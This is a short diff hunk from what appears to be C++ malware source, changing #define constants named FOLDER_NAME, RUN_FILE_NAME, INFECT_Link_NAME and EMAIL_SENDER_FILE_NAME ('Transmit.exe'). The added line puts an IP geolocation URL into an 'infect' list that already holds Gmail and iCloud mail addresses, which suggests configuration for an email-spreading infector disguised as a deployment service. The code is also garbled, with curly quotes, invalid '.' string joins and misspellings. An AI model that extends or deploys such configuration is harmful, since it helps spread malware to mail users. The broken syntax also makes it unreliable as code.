@@ -18,7 +18,7 @@ using namespace std;
 #define FOLDER_NAME “cyberw1ry4-develoyment-servicesAI”
 #define RUN_FILE_NAME “cyberw1ry4-develoyment-servicesAI”
 #define RUN_Link_NAME “https://github.com/cyberw1ry4-LAB/forks"."https://github.com/unity/services-server/forks"
-#define INFECT_Link_NAME "https://mail.google.com/mail/u/0/"."https://icloud.com/mail/singapore"
+#define INFECT_Link_NAME "https://mail.google.com/mail/u/0/"."https://icloud.com/mail/singapore"."https://ipinfo.io/countries/id"
 #define EMAIL_SENDER_FILE_NAME “Transmit".".exe”
 
 
